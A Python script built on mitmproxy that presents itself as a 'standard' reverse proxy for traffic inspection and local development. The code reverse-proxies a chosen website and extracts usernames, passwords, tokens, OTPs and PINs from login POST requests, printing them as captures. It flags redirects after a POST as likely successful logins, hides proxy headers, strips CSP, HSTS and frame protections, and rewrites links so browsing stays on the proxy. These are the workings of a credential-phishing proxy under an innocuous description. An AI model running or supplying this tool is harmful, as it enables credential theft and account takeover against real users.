#!/usr/bin/env python3
"""
Standard MITM Reverse Proxy
---------------------------
A clean, straightforward reverse proxy for intercepting and inspecting
traffic. Best used for standard websites, API inspection, or local dev.
"""

import argparse
import asyncio
import json
import logging
from urllib.parse import urlparse, parse_qs

from mitmproxy import http
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster

# Common auth-related field names to watch for
AUTH_FIELDS = {
    "username", "password", "email", "user", "pass",
    "passwd", "login", "token", "credential", "secret",
    "otp", "pin", "code", "key", "auth"
}

class ReverseProxyAddon:
    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.parsed = urlparse(self.target)
        self.target_host   = self.parsed.hostname
        self.target_port   = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.target_scheme = self.parsed.scheme
        self.target_origin = f"{self.target_scheme}://{self.parsed.netloc}"

    def _print_capture(self, url: str, fields: dict, source: str):
        print("\n" + "="*60)
        print(f"  🔐 AUTH CAPTURE [{source}]")
        print(f"  URL : {url}")
        print(f"  {'─'*54}")
        for key, value in fields.items():
            # parse_qs wraps values in lists, unwrap single-item ones
            display_val = value[0] if isinstance(value, list) and len(value) == 1 else value
            print(f"  {key:<20} : {display_val}")
        print("="*60 + "\n")

    def request(self, flow: http.HTTPFlow):
        # 1. Repoint the network request to the real backend
        flow.request.host   = self.target_host
        flow.request.port   = self.target_port
        flow.request.scheme = self.target_scheme

        # 2. Fix the Host header so the backend server accepts it
        flow.request.headers["host"] = self.parsed.netloc

        # 3. Remove proxy-revealing headers
        for h in ("x-forwarded-for", "x-real-ip", "via", "forwarded"):
            flow.request.headers.pop(h, None)

        logging.info(f"→ {flow.request.method} {flow.request.pretty_url}")

        # 4. Capture auth form submissions
        if flow.request.method == "POST":
            ct = flow.request.headers.get("content-type", "")

            # Handle standard HTML form submissions
            if "application/x-www-form-urlencoded" in ct:
                try:
                    body = flow.request.get_text(strict=False)
                    params = parse_qs(body)
                    captured = {k: v for k, v in params.items()
                                if k.lower() in AUTH_FIELDS}
                    if captured:
                        self._print_capture(flow.request.pretty_url, captured, "FORM")
                except Exception as e:
                    logging.warning(f"Form parse failed: {e}")

            # Handle JSON payloads (fetch/XHR logins)
            elif "application/json" in ct:
                try:
                    body = json.loads(flow.request.get_text())
                    if isinstance(body, dict):
                        captured = {k: v for k, v in body.items()
                                    if k.lower() in AUTH_FIELDS}
                        if captured:
                            self._print_capture(flow.request.pretty_url, captured, "JSON")
                except Exception as e:
                    logging.warning(f"JSON parse failed: {e}")

            # Handle multipart forms (less common for auth, but possible)
            elif "multipart/form-data" in ct:
                try:
                    fields = flow.request.multipart_form
                    captured = {k.decode(): v.decode() for k, v in fields.items()
                                if k.decode().lower() in AUTH_FIELDS}
                    if captured:
                        self._print_capture(flow.request.pretty_url, captured, "MULTIPART")
                except Exception as e:
                    logging.warning(f"Multipart parse failed: {e}")

    def response(self, flow: http.HTTPFlow):
        resp = flow.response
        status = resp.status_code
        ct = resp.headers.get("content-type", "")

        logging.info(f"← {status} {ct.split(';')[0]}  ({len(resp.content)} bytes)")

        # Hint: a 302 after a POST is a strong signal the login succeeded
        if flow.request.method == "POST" and status in (301, 302, 303, 307, 308):
            print(f"  ↳ Redirect after POST ({status}) → likely successful login")

        # 1. Strip security headers that lock the browser to the real origin
        for h in (
            "content-security-policy",
            "content-security-policy-report-only",
            "x-frame-options",
            "strict-transport-security",
        ):
            resp.headers.pop(h, None)

        # 2. Rewrite redirect Locations to stay on the proxy
        if "location" in resp.headers:
            loc = resp.headers["location"]
            if loc.startswith(self.target_origin):
                resp.headers["location"] = loc[len(self.target_origin):]

        # 3. Simple string replacement for HTML/CSS URLs
        if "text/html" in ct or "text/css" in ct:
            try:
                text = resp.get_text(strict=False)
                text = text.replace(self.target_origin + "/", "/")
                text = text.replace(self.target_origin, "/")
                text = text.replace(f"//{self.parsed.netloc}/", "//localhost/")
                resp.set_text(text)
            except Exception as e:
                logging.warning(f"Rewrite failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="Standard mitmproxy reverse proxy")
    parser.add_argument("--target", "-t", required=True, help="Backend website (e.g., https://example.com)")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Local port (default: 8080)")
    args = parser.parse_args()

    target = args.target if args.target.startswith("http") else f"https://{args.target}"
    parsed = urlparse(target)
    upstream = f"{parsed.scheme}://{parsed.netloc}"

    print(f"\n┌──────────────────────────────────────────┐")
    print(f"│  Standard MITM Reverse Proxy             │")
    print(f"│  Listen  : http://127.0.0.1:{args.port:<13}│")
    print(f"│  Target  : {upstream:<28}│")
    print(f"│  Press Ctrl+C to stop                    │")
    print(f"└──────────────────────────────────────────┘\n")

    opts = Options(
        listen_host="127.0.0.1",
        listen_port=args.port,
        mode=[f"reverse:{upstream}"],
        ssl_insecure=True,
    )

    async def start_proxy():
        master = DumpMaster(opts, with_termlog=True, with_dumper=False)
        master.addons.add(ReverseProxyAddon(target))
        await master.run()

    try:
        asyncio.run(start_proxy())
    except KeyboardInterrupt:
        print("\nProxy stopped cleanly.")

if __name__ == "__main__":
    main()